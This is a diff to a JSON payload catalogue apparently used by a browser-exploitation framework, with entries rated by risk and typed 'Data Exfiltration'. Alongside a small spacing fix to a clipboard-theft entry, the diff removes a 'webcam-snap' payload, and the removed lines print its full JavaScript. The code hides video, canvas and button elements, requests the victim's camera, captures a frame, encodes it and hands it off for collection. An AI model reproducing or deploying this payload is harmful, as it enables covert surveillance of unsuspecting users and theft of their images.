@@ -48,7 +48,7 @@
       "type": "Data Exfiltration",
       "author": "wagyu",
       "risk": 4,
-      "notes": "*Only works on browsers that support the clipboard API. Firefox will require it to be enabled in about:config"
+      "notes": "* Only works on browsers that support the clipboard API. Firefox will require it to be enabled in about:config"
     },
     {
       "name": "popunder-window",
@@ -59,15 +59,5 @@
       "author": "wagyu",
       "risk": 3,
       "notes": "* Newer browsers ask for permission"
-    },
-    {
-      "name": "webcam-snap",
-      "description": "Has Issues: Take a snapshot of the victims webcam",
-      "payload": "let e = 0,t = !1,i = null,n = null,a = null; function d() {(i = document.body.appendChild(document.createElement('video'))).style.display = 'none', (n = document.body.appendChild(document.createElement('canvas'))).style.display = 'none', (a = document.body.appendChild(document.createElement('button'))).style.display = 'none', navigator.mediaDevices.getUserMedia({video: !0,audio: !1}).then(e => {i.srcObject = e, i.play()}).catch(e => {console.error(`An error occurred: ${e}`)}), i.addEventListener('canplay', a => {t || (isNaN(e = i.videoHeight / (i.videoWidth / 320)) && (e = 320 / (4 / 3)), i.setAttribute('width', 320), i.setAttribute('height', e), n.setAttribute('width', 320), n.setAttribute('height', e), t = !0)}, !1), a.addEventListener('click', e => {l(), e.preventDefault()}, !1), setTimeout(function () {a.click()}, 1e3)}async function l() {let t = n.getContext('2d');if (e) {n.width = 320, n.height = e, t.drawImage(i, 0, 0, 320, e);let a = await n.toDataURL('application/base64');setData('webcam_snap', await a, 'image');}}d();",
-      "compatibility": "All Browsers*",
-      "type": "Data Exfiltration",
-      "author": "wagyu",
-      "risk": 4,
-      "notes": "* Browsers ask for permission"
     }
   ]
